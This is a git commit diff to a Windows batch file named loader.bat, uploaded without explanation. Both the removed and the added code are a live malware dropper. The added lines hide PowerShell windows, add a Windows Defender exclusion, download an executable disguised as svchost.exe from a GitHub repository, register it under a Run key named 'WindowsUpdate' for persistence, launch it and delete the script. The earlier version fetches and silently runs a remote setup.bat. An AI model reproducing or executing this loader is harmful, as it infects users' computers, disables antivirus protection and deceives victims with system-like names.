90bb932757d474973d788d333bd64e2dc3277c5b
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-26 15:44:22 +0500

    Add files via upload

--- loader.bat
+++ loader.bat
@@ -1,18 +1,9 @@
 @echo off
-set "MY_DIR=%~dp0"
-set "MY_DIR=%MY_DIR:~0,-1%"
-set "DIR=%LOCALAPPDATA%\Microsoft\Windows\%RANDOM%%RANDOM%"
-mkdir "%DIR%" 2>nul
-
-if exist "%MY_DIR%\setup.bat" (
-    copy "%MY_DIR%\setup.bat" "%DIR%\setup.bat" >nul 2>&1
-) else (
-    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/setup.bat' -OutFile '%DIR%\setup.bat' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
-    if errorlevel 1 exit /b 1
+cd /d "%~dp0"
+powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0svchost.exe'"
+powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
+if exist "%~dp0svchost.exe" (
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "%~dp0svchost.exe" /f >nul
+    start /b "" "%~dp0svchost.exe"
 )
-
-if not exist "%DIR%\setup.bat" exit /b 1
-
-powershell -Command "Start-Process -FilePath '%DIR%\setup.bat' -WorkingDirectory '%DIR%' -WindowStyle Hidden -Wait"
-powershell -Command "Start-Job -ScriptBlock { param($d,$s) Start-Sleep 3; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath $s -Force -ErrorAction SilentlyContinue } -ArgumentList '%DIR%','%~f0'" >nul 2>&1
-exit /b 0
+del "%~f0" >nul 2>&1
